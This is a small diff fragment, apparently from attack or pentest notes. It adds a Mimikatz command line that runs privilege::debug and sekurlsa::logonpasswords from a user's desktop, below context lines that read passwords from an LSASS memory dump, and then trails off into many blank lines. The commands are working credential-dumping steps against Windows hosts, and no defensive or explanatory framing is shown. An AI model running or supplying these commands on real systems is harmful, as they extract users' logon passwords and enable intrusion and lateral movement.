@@ -3,3 +3,26 @@
 sekurlsa::minidump C:\Windows\Temp\lsass.dmp
 sekurlsa::logonpasswords
 ```
+
+C:\Users\bdavid\Desktop\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
